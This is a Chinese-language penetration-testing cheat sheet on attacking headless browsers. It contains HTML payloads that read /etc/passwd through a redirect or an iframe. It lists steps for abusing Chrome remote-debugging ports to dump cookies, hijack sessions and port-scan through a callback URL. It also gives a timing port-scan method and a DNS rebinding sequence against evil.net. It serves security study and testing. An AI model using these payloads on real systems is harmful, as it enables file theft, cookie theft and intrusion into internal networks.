# 无头浏览器

> 无头浏览器是一种没有图形用户界面的网络浏览器。它的工作方式与普通的浏览器（如Chrome或Firefox）相同，能够解析HTML、CSS和JavaScript，但它是在后台运行的，不会显示任何可视化内容。
> 无头浏览器主要用于自动化任务，例如网络爬虫、测试和脚本运行。它们在不需要完整的浏览器功能或者资源（如内存或CPU）受限的情况下特别有用。

## 摘要

* [无头命令](#无头命令)
* [本地文件读取](#本地文件读取)
* [调试端口](#调试端口)
* [网络](#网络)
    * [端口扫描](#端口扫描)
    * [DNS重绑定](#dns重绑定)
* [参考文献](#参考文献)

## 无头命令

无头浏览器命令示例：

* Google Chrome

    ```ps1
    google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com
    ```

* Mozilla Firefox

    ```ps1
    firefox --screenshot https://www.google.com
    ```

* Microsoft Edge

    ```ps1
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --window-size=1280,720 --screenshot="C:\tmp\screen.png" "https://google.com"
    ```

## 本地文件读取

目标：`google-chrome-stable --headless[=(new|old)] --print-to-pdf https://site/file.html`

* JavaScript重定向

    ```html
    <html>
        <body>
            <script>
                window.location="/etc/passwd"
            </script>
        </body>
    </html>
    ```

* iframe

    ```html
    <html>
        <body>
            <iframe src="/etc/passwd" height="640" width="640"></iframe>
        </body>
    </html>
    ```

## 调试端口

**目标**：`google-chrome-stable --headless=new --remote-debugging-port=XXXX ./index.html`

**工具**：

* [slyd0g/WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) - 与基于Chromium的浏览器的调试端口交互，查看打开的标签页、安装的扩展程序和cookies
* [slyd0g/ripWCMN.py](https://gist.githubusercontent.com/slyd0g/955e7dde432252958e4ecd947b8a7106/raw/d96c939adc66a85fa9464cec4150543eee551356/ripWCMN.py) - 使用Python编写的WCMN替代工具，修复WebSocket连接时`origin`为空头的问题。

> [!注意]  
> 自从2022年12月20日Chrome更新后，必须使用参数`--remote-allow-origins="*"`启动浏览器才能通过WhiteChocolateMacademiaNut连接到websocket。

**漏洞利用**：

* 连接并交互浏览器：`chrome://inspect/#devices`，`opera://inspect/#devices`
* 杀掉当前运行的浏览器并使用`--restore-last-session`以访问用户的标签页
* Dump cookies：
* 存储的数据：`chrome://settings`
* 端口扫描：循环打开`http://localhost:<port>/json/new?http://callback.example.com?port=<port>`
* 泄露UUID：Iframe：`http://127.0.0.1:<port>/json/version`
* 本地文件读取：[pich4ya/chrome_remote_debug_lfi.py](https://gist.github.com/pich4ya/5e7d3d172bb4c03360112fd270045e05)
* Node inspector `--inspect` 类似于 `--remote-debugging-port`

    ```ps1
    node --inspect app.js # 默认端口9229
    node --inspect=4444 app.js # 自定义端口4444
    node --inspect=0.0.0.0:4444 app.js
    ```

> [!注意]  
> 参数`--user-data-dir=/path/to/data_dir`用于指定用户的资料目录，Chromium在此存储所有应用程序数据，如cookies和历史记录。如果未指定此参数启动Chromium，您会注意到浏览器中不会加载您的书签、收藏夹或历史记录。

## 网络

### 端口扫描

端口扫描：时间攻击

* 动态插入指向假设关闭端口的`<img>`标签。测量onerror的时间。
* 至少重复10次 → 获取关闭端口错误的平均时间
* 测试随机端口10次并测量错误时间
* 如果`time_to_error(random_port) > time_to_error(closed_port)*1.3` → 端口是开放的

**考虑事项**：

* Chrome默认阻止“已知端口”列表中的端口
* Chrome阻止除localhost以外的本地网络地址访问

### DNS重绑定

* [nccgroup/singularity](https://github.com/nccgroup/singularity) - DNS重绑定攻击框架。

1. Chrome将发出两次DNS请求：`A`和`AAAA`记录
    * `AAAA`响应有效的互联网IP
    * `A`响应内部IP
2. Chrome优先连接到IPv6（evil.net）
3. 在第一次响应后立即关闭IPv6监听器
4. 打开指向evil.net的Iframe
5. Chrome尝试连接到IPv6但失败后回退到IPv4
6. 从顶层窗口注入脚本到Iframe中以提取内容

## 参考文献

* [使用JavaScript进行基于浏览器的端口扫描 - 尼古拉·楚哈 - 2021年1月10日](https://incolumitas.com/2021/01/10/browser-based-port-scanning/)
* [Chrome开发者工具协议 - 文档 - 2017年7月3日](https://chromedevtools.github.io/devtools-protocol/)
* [带有Chromium远程调试端口的Cookies - Justin Bui - 2020年12月17日](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
* [使用Chromium远程调试器调试Cookies Dumping故障 - Justin Bui - 2023年7月16日](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
* [Node inspector/CEF调试滥用 - HackTricks - 2024年7月18日](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse)
* [渗透测试后：利用Chrome的调试功能远程观察和控制浏览会话 - wunderwuzzi - 2020年4月28日](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
* [Chrome和Safari中可靠分秒级DNS重绑定技巧 - Daniel Thatcher - 2023年12月6日](https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari)